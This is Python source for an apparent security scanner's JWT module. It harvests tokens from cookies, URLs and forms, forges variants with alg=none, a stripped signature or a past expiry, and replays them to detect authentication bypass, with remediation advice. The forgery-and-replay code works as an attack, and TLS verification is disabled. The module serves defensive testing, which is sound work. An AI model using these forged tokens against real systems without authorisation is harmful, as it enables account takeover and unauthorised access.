"""JWT security checks module.

Performs both static token analysis AND active replay testing to verify
whether the server actually enforces JWT security properties.
"""

from __future__ import annotations

import base64
import json
import time
from typing import Callable
from urllib.parse import parse_qs, urlparse

import httpx

from scanner.utils.logger import get_logger

log = get_logger("jwt")


def _b64url_decode(segment: str) -> bytes:
    padding = "=" * (-len(segment) % 4)
    return base64.urlsafe_b64decode(segment + padding)


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _extract_jwt_candidates(endpoints: list[str], forms: list[dict], cookie: str | None) -> list[tuple[str, str, str]]:
    """Return list of (token, source_description, endpoint_url) tuples."""
    tokens: list[tuple[str, str, str]] = []
    if cookie:
        for part in cookie.split(";"):
            if "=" not in part:
                continue
            key, value = part.split("=", 1)
            value = value.strip()
            if value.count(".") == 2:
                tokens.append((value, f"cookie:{key.strip()}", ""))

    for url in endpoints[:40]:
        qs = parse_qs(urlparse(url).query, keep_blank_values=True)
        for k, vals in qs.items():
            if "jwt" in k.lower() or "token" in k.lower() or "auth" in k.lower():
                for v in vals:
                    if v.count(".") == 2:
                        tokens.append((v, f"query:{k}", url))

    for form in forms[:20]:
        for inp in form.get("inputs", []):
            name = (inp.get("name") or "").lower()
            value = inp.get("value") or ""
            if ("jwt" in name or "token" in name or "auth" in name) and value.count(".") == 2:
                tokens.append((value, f"form:{name}", form.get("action", "")))

    # Deduplicate by token value, keep first occurrence
    seen: set[str] = set()
    unique: list[tuple[str, str, str]] = []
    for token, source, url in tokens:
        if token not in seen:
            seen.add(token)
            unique.append((token, source, url))
    return unique


def _forge_alg_none(token: str) -> str:
    """Create a forged token with alg=none and empty signature."""
    parts = token.split(".")
    if len(parts) != 3:
        return token
    try:
        header = json.loads(_b64url_decode(parts[0]).decode("utf-8", errors="ignore"))
    except Exception:
        return token
    header["alg"] = "none"
    new_header = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    return f"{new_header}.{parts[1]}."


def _forge_expired(token: str) -> str:
    """Create a forged token with exp set to a past timestamp."""
    parts = token.split(".")
    if len(parts) != 3:
        return token
    try:
        payload = json.loads(_b64url_decode(parts[1]).decode("utf-8", errors="ignore"))
    except Exception:
        return token
    payload["exp"] = int(time.time()) - 86400  # 24 hours ago
    new_payload = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{parts[0]}.{new_payload}.{parts[2]}"


def _forge_stripped_sig(token: str) -> str:
    """Strip the signature entirely."""
    parts = token.split(".")
    if len(parts) != 3:
        return token
    return f"{parts[0]}.{parts[1]}."


def _replay_token(
    client: httpx.Client,
    original_token: str,
    forged_token: str,
    source: str,
    endpoint_url: str,
    cookie_str: str | None,
) -> bool:
    """Send the forged token and check if the server accepts it (HTTP 200).
    
    Returns True if the server accepted the forged token.
    """
    if not endpoint_url:
        return False

    headers: dict[str, str] = {}

    if source.startswith("cookie:"):
        cookie_key = source.split(":", 1)[1]
        if cookie_str:
            # Replace the original token in the cookie string
            new_cookie = cookie_str.replace(original_token, forged_token)
            headers["Cookie"] = new_cookie
        else:
            headers["Cookie"] = f"{cookie_key}={forged_token}"
    elif source.startswith("query:"):
        param_name = source.split(":", 1)[1]
        parsed = urlparse(endpoint_url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[param_name] = [forged_token]
        from urllib.parse import urlencode, urlunparse
        endpoint_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
    else:
        headers["Authorization"] = f"Bearer {forged_token}"

    try:
        resp = client.get(endpoint_url, headers=headers)
        # If the server returns 200 with the forged token, it accepted it
        return resp.status_code == 200
    except httpx.HTTPError:
        return False


def test_jwt_checks(
    endpoints: list[str],
    forms: list[dict],
    cookie: str | None = None,
    timeout: float = 10.0,
    quick: bool = False,
    should_stop: Callable[[], bool] | None = None,
) -> list[dict]:
    """Inspect discovered JWTs for weak properties AND test server enforcement."""
    findings: list[dict] = []
    candidates = _extract_jwt_candidates(endpoints, forms, cookie)
    if quick:
        candidates = candidates[:5]

    with httpx.Client(verify=False, timeout=timeout, follow_redirects=True) as client:
        for token, source, endpoint_url in candidates:
            if should_stop and should_stop():
                log.info("JWT checks cancelled")
                break

            parts = token.split(".")
            if len(parts) != 3:
                continue

            try:
                header = json.loads(_b64url_decode(parts[0]).decode("utf-8", errors="ignore") or "{}")
            except Exception:
                continue

            try:
                payload = json.loads(_b64url_decode(parts[1]).decode("utf-8", errors="ignore") or "{}")
            except Exception:
                payload = {}

            alg = str(header.get("alg", "")).lower()

            # ── Static checks ─────────────────────────────────────
            if alg == "none":
                findings.append(_to_finding(
                    token, "JWT uses 'none' algorithm", "Header contains alg=none",
                    "High", "jwt",
                ))

            if "kid" in header and isinstance(header["kid"], str):
                kid = header["kid"]
                if any(x in kid for x in ("../", "..\\", "/", "\\", "http://", "https://")):
                    findings.append(_to_finding(
                        token, "Potentially unsafe JWT kid header value",
                        f"Suspicious kid value: {kid}", "Medium", "jwt",
                    ))

            if payload and "exp" not in payload:
                findings.append(_to_finding(
                    token, "JWT missing exp claim",
                    "Token payload does not include expiry", "Medium", "jwt",
                ))

            # ── Active replay tests ───────────────────────────────
            if endpoint_url and not (should_stop and should_stop()):
                # Test 1: alg=none bypass
                forged = _forge_alg_none(token)
                if _replay_token(client, token, forged, source, endpoint_url, cookie):
                    findings.append(_to_finding(
                        token,
                        "JWT alg=none ACCEPTED by server",
                        "Server accepted forged token with alg=none and empty signature — "
                        "critical authentication bypass confirmed",
                        "Critical", "jwt",
                    ))
                    log.info("[JWT] alg=none bypass CONFIRMED on %s", endpoint_url)

                # Test 2: stripped signature
                if not (should_stop and should_stop()):
                    stripped = _forge_stripped_sig(token)
                    if _replay_token(client, token, stripped, source, endpoint_url, cookie):
                        findings.append(_to_finding(
                            token,
                            "JWT accepted without signature",
                            "Server accepted token with signature completely removed",
                            "Critical", "jwt",
                        ))
                        log.info("[JWT] Stripped-signature bypass CONFIRMED on %s", endpoint_url)

                # Test 3: expired token
                if not (should_stop and should_stop()):
                    expired = _forge_expired(token)
                    if _replay_token(client, token, expired, source, endpoint_url, cookie):
                        findings.append(_to_finding(
                            token,
                            "Expired JWT accepted by server",
                            "Server accepted token with exp set 24 hours in the past",
                            "High", "jwt",
                        ))
                        log.info("[JWT] Expired-token bypass CONFIRMED on %s", endpoint_url)

    return findings


def _to_finding(token: str, title: str, evidence: str, severity: str, vuln_type: str) -> dict:
    from scanner.core.cvss_builder import build_finding_cvss
    ctx = {}
    if severity == "Critical":
        ctx["confidentiality"] = "H"
        ctx["integrity"] = "H"
    vector, score, sev = build_finding_cvss(vuln_type, context=ctx)
    # Override severity for replay-confirmed findings
    if severity == "Critical":
        sev = "Critical"
    return {
        "title": f"JWT: {title}",
        "severity": sev,
        "cvss_score": score,
        "cvss_vector": vector,
        "affected_url": "N/A",
        "parameter": "JWT token",
        "payload": token[:120] + ("..." if len(token) > 120 else ""),
        "evidence": evidence,
        "remediation": "Enforce strong JWT validation: disallow alg=none, validate "
                       "issuer/audience/expiry, verify signature with a strong secret, "
                       "and strictly sanitize kid usage.",
        "owasp_category": "A07:2025 - Authentication Failures",
    }
